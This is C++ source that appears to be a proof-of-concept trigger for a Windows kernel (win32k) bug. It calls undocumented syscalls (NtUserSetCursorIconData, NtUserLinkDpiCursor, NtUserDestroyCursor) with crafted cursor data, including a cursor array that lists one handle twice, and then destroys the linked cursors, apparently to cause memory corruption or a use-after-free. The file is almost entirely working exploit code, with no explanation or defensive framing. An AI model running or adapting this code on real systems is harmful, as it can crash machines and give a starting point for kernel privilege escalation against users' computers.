
#include <stdio.h>
#include <windows.h>
#include <tchar.h>
#include <strsafe.h>
#include <winternl.h>


#if defined(_WIN64)
#pragma comment(lib, "win32u_x64.lib")
#else
#pragma comment(lib, "win32u_x86.lib")
#endif

#pragma comment(lib, "ntdll.lib")

typedef enum { L_DEBUG, L_INFO, L_WARN, L_ERROR } LEVEL, *PLEVEL;
#define MAX_LOG_MESSAGE 1024

BOOL LogMessage(LEVEL Level, LPCTSTR Format, ...)
{
	TCHAR Buffer[MAX_LOG_MESSAGE] = { 0 };
	va_list Args;

	va_start(Args, Format);
	StringCchVPrintf(Buffer, MAX_LOG_MESSAGE, Format, Args);
	va_end(Args);

	switch (Level) {
	case L_DEBUG: _ftprintf(stdout, TEXT("[?] %s\n"), Buffer); break;
	case L_INFO:  _ftprintf(stdout, TEXT("[+] %s\n"), Buffer); break;
	case L_WARN:  _ftprintf(stderr, TEXT("[*] %s\n"), Buffer); break;
	case L_ERROR: _ftprintf(stderr, TEXT("[!] %s\n"), Buffer); break;
	}

	fflush(stdout);
	fflush(stderr);

	return TRUE;
}


typedef struct tagCURSORDATA
{
	int field_0;
	int field_4;
	int rt;
	int CURSORF_flags;
	int bpp;
	HBITMAP hbmMask;
	HBITMAP hmbColor;
	int field_1C;
	int field_20;
	int field_24;
	int field_28;
	int field_2C;
	int field_30;
	int field_34;
	int field_38;
	int field_3C;
	int cpcur;
	int cicur;
	HCURSOR* aspcur;
	int aicur;
	DWORD* ajifRate;
	int field_54;
}CURSORDATA, *PCURSORDATA;

EXTERN_C
BOOL
NTAPI
NtUserSetCursorIconData(
	IN HCURSOR         hCursor,
	IN PUNICODE_STRING pstrModName,
	IN PUNICODE_STRING pstrResName,
	IN PCURSORDATA     pData);

EXTERN_C
ULONG_PTR
NTAPI
NtUserCallOneParam(
	IN ULONG_PTR dwParam,
	IN DWORD xpfnProc);


EXTERN_C
BOOL
NTAPI
NtUserDestroyCursor(
	IN HCURSOR hcurs,
	IN DWORD cmd);


EXTERN_C
BOOL NTAPI
NtUserLinkDpiCursor(HCURSOR hCursor1, HCURSOR hCursor2, DWORD dwFlags);


void main()
{
	UNICODE_STRING uniModName;
	UNICODE_STRING uniResName;

	HCURSOR hCursor_0x00470301 = (HCURSOR)NtUserCallOneParam(0, 0x32);
	HCURSOR hCursor_0x003C03A5 = (HCURSOR)NtUserCallOneParam(0, 0x32);
	HBITMAP hbmp_0x10050a0b = CreateBitmap(0x12, 0x3d, 1, 32, NULL);
	HBITMAP hbmp_0x8b050931 = CreateBitmap(0x62, 0x40, 1, 32, NULL);
	HCURSOR hCursor_0x001800EB = (HCURSOR)NtUserCallOneParam(0, 0x32);
	HCURSOR hCursor_0x00490157 = (HCURSOR)NtUserCallOneParam(0, 0x32);
	
	LogMessage(L_INFO, TEXT("hCursor_0x00470301=0x%p"), hCursor_0x00470301);
	LogMessage(L_INFO, TEXT("hCursor_0x003C03A5=0x%p"), hCursor_0x003C03A5);
	LogMessage(L_INFO, TEXT("hCursor_0x001800EB=0x%p"), hCursor_0x001800EB);
	LogMessage(L_INFO, TEXT("hCursor_0x00490157=0x%p"), hCursor_0x00490157);
	
	HBITMAP hbmp_0xfd05098f = CreateBitmap(0x3b, 0x5f, 1, 32, NULL);
	CURSORDATA curData = { 0 };

	RtlInitUnicodeString(&uniModName, L"user32");
	RtlInitUnicodeString(&uniResName, L"fuck1");

	curData.CURSORF_flags = 0x6530dec6;
	curData.hmbColor = hbmp_0x8b050931;
	curData.hbmMask = hbmp_0x8b050931;

	curData.cpcur = 4;
	curData.aspcur = new HCURSOR[curData.cpcur];
	curData.aspcur[0] = hCursor_0x003C03A5;
	curData.aspcur[1] = hCursor_0x001800EB;
	curData.aspcur[2] = hCursor_0x00470301;
	curData.aspcur[3] = hCursor_0x003C03A5;

	NtUserSetCursorIconData(hCursor_0x001800EB, &uniModName, &uniResName, &curData);

	NtUserLinkDpiCursor(hCursor_0x00490157, hCursor_0x001800EB, 0x60);

	ZeroMemory(&curData, sizeof(curData));

	curData.CURSORF_flags = 0xd9196655;
	curData.hmbColor = hbmp_0x10050a0b;
	curData.hbmMask = hbmp_0xfd05098f;

	curData.cpcur = 2;
	curData.aspcur = new HCURSOR[curData.cpcur];
	curData.aspcur[0] = hCursor_0x00470301;
	curData.aspcur[1] = hCursor_0x00470301;

	NtUserSetCursorIconData(hCursor_0x00490157, &uniModName, &uniResName, &curData);

	DeleteObject(hbmp_0x10050a0b);
	DeleteObject(hbmp_0x8b050931);
	DeleteObject(hbmp_0xfd05098f);


	LogMessage(L_INFO, TEXT("destroy hCursor_0x00470301=0x%p"), hCursor_0x00470301);
	NtUserDestroyCursor(hCursor_0x00470301, 0);

	LogMessage(L_INFO, TEXT("destroy hCursor_0x003C03A5=0x%p"), hCursor_0x003C03A5);
	NtUserDestroyCursor(hCursor_0x003C03A5, 0);
}